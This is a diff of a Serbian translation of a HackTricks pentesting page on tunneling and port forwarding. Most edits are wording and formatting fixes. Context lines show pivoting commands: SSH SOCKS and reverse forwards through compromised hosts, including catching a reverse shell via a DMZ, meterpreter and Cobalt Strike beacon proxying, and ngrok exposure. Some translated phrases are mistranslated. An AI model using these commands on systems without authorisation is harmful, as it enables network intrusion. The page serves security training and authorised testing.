@@ -1,15 +1,15 @@
 # Tunneling and Port Forwarding
 
 {% hint style="success" %}
-Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Learn & practice AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Support HackTricks</summary>
 
 * Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
 * **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
@@ -69,9 +69,9 @@ Lokalni port --> Kompromitovani host (SSH) --> Gde god
 ```bash
 ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
 ```
-### Обратно пренос порта
+### Обратно прослеђивање порта
 
-Ово је корисно за добијање обрнутог шелла изнутарних хостова преко DMZ-а до вашег хоста:
+Ово је корисно за добијање обрнутог шела изнутра хостова преко DMZ-а до вашег хоста:
 ```bash
 ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 # Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
@@ -104,7 +104,7 @@ route add -net 10.0.0.0/16 gw 1.1.1.1
 ## SSHUTTLE
 
 Možete **tunelovati** putem **ssh** sav **saobraćaj** ka **podmreži** kroz host.\
-Na primer, proslediti sav saobraćaj koji ide ka 10.10.10.0/24
+Na primer, prosleđivanje savremenog saobraćaja koji ide ka 10.10.10.0/24
 ```bash
 pip install sshuttle
 sshuttle -r user@host 10.10.10.10/24
@@ -118,7 +118,7 @@ sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
 
 ### Port2Port
 
-Lokalni port --> Kompromitovana mašina (aktivna sesija) --> Treća\_mašina:Port
+Lokalni port --> Kompromitovani host (aktivna sesija) --> Treća\_kutija:Port
 ```bash
 # Inside a meterpreter session
 portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
@@ -148,7 +148,7 @@ echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 
 ### SOCKS proxy
 
-Otvorite port na teamserver-u koji sluša na svim interfejsima i koji se može koristiti za **usmeravanje saobraćaja kroz beacon**.
+Otvorite port na teamserver-u koji sluša na svim interfejsima koji se mogu koristiti za **usmeravanje saobraćaja kroz beacon**.
 ```bash
 beacon> socks 1080
 [+] started SOCKS4a server on: 1080
@@ -167,9 +167,9 @@ rportfwd stop [bind port]
 ```
 To note:
 
-- Beaconov obrnuti port forwarding je dizajniran da **tuneluje saobraćaj ka Team Server-u, a ne za preusmeravanje između pojedinačnih mašina**.
-- Saobraćaj je **tunelovan unutar Beaconovog C2 saobraćaja**, uključujući P2P linkove.
-- **Administratorske privilegije nisu potrebne** za kreiranje obrnuti port forwarding na visokim portovima.
+* Beaconov obrnuti port forwarding je dizajniran da **tuneluje saobraćaj ka Team Server-u, a ne za preusmeravanje između pojedinačnih mašina**.
+* Saobraćaj je **tunelovan unutar Beaconovog C2 saobraćaja**, uključujući P2P linkove.
+* **Administratorske privilegije nisu potrebne** za kreiranje obrnuti port forwarding na visokim portovima.
 
 ### rPort2Port local
 
@@ -379,8 +379,8 @@ Sada možete koristiti [**Proxifier**](https://www.proxifier.com/) **da proksira
 ## Proksiranje Windows GUI aplikacija
 
 Možete naterati Windows GUI aplikacije da prolaze kroz proksi koristeći [**Proxifier**](https://www.proxifier.com/).\
-U **Profile -> Proxy Servers** dodajte IP adresu i port SOCKS servera.\
-U **Profile -> Proxification Rules** dodajte ime programa koji želite da proksirate i veze ka IP adresama koje želite da proksirate.
+U **Profil -> Proksi serveri** dodajte IP adresu i port SOCKS servera.\
+U **Profil -> Pravila proksiranja** dodajte ime programa koji želite da proksirate i veze ka IP adresama koje želite da proksirate.
 
 ## NTLM proksi zaobilaženje
 
@@ -402,7 +402,7 @@ Domain CONTOSO.COM
 Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
-Sada, ako na primer postavite na žrtvi **SSH** servis da sluša na portu 443. Možete se povezati na njega kroz port napadača 2222.\
+Sada, ako na primer postavite na žrtvi **SSH** servis da sluša na portu 443. Možete se povezati na njega kroz port 2222 napadača.\
 Takođe možete koristiti **meterpreter** koji se povezuje na localhost:443, a napadač sluša na portu 2222.
 
 ## YARP
@@ -452,7 +452,7 @@ listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this b
 ```
 #### Promena proxychains DNS
 
-Proxychains presreće `gethostbyname` libc poziv i tuneluje tcp DNS zahtev kroz socks proxy. Po **default-u** DNS server koji proxychains koristi je **4.2.2.2** (hardkodiran). Da biste ga promenili, uredite datoteku: _/usr/lib/proxychains3/proxyresolv_ i promenite IP. Ako ste u **Windows okruženju**, možete postaviti IP **domen kontrolera**.
+Proxychains presreće `gethostbyname` libc poziv i tuneluje tcp DNS zahtev kroz socks proxy. Po **default-u** DNS server koji proxychains koristi je **4.2.2.2** (hardkodiran). Da biste ga promenili, uredite datoteku: _/usr/lib/proxychains3/proxyresolv_ i promenite IP. Ako ste u **Windows okruženju** možete postaviti IP **domen kontrolera**.
 
 ## Tunneli u Go
 
@@ -489,13 +489,13 @@ ssh -D 9050 -p 2222 -l user 127.0.0.1
 ```
 ## ngrok
 
-**[ngrok](https://ngrok.com/) je alat za izlaganje rešenja internetu u jednoj komandnoj liniji.**
-*URI za izlaganje su kao:* **UID.ngrok.io**
+[**ngrok**](https://ngrok.com/) **je alat za izlaganje rešenja internetu u jednoj komandnoj liniji.**\
+&#xNAN;_&#x45;xposition URI su kao:_ **UID.ngrok.io**
 
 ### Instalacija
 
-- Napravite nalog: https://ngrok.com/signup
-- Preuzimanje klijenta:
+* Napravite nalog: https://ngrok.com/signup
+* Preuzimanje klijenta:
 ```bash
 tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
 chmod a+x ./ngrok
@@ -506,7 +506,7 @@ chmod a+x ./ngrok
 
 **Dokumentacija:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).
 
-*Takođe je moguće dodati autentifikaciju i TLS, ako je potrebno.*
+_ Takođe je moguće dodati autentifikaciju i TLS, ako je potrebno._
 
 #### Tunneling TCP
 ```bash
@@ -523,7 +523,7 @@ chmod a+x ./ngrok
 ```
 #### Sniffing HTTP calls
 
-*Koristan za XSS, SSRF, SSTI ...*
+_Korisno za XSS, SSRF, SSTI ..._\
 Direktno iz stdout-a ili u HTTP interfejsu [http://127.0.0.1:4040](http://127.0.0.1:4000).
 
 #### Tunneling internal HTTP service
@@ -536,8 +536,9 @@ Direktno iz stdout-a ili u HTTP interfejsu [http://127.0.0.1:4040](http://127.0.
 #### ngrok.yaml jednostavan primer konfiguracije
 
 Otvara 3 tunela:
-- 2 TCP
-- 1 HTTP sa izlaganjem statičkih fajlova iz /tmp/httpbin/
+
+* 2 TCP
+* 1 HTTP sa izlaganjem statičkih fajlova iz /tmp/httpbin/
 ```yaml
 tunnels:
 mytcp:
@@ -556,15 +557,15 @@ addr: file:///tmp/httpbin/
 * [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)
 
 {% hint style="success" %}
-Učite i vežbajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Učite i vežbajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Učite i vežbajte AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
+Učite i vežbajte GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Podržite HackTricks</summary>
 
 * Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
-* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
 * **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
 
 </details>
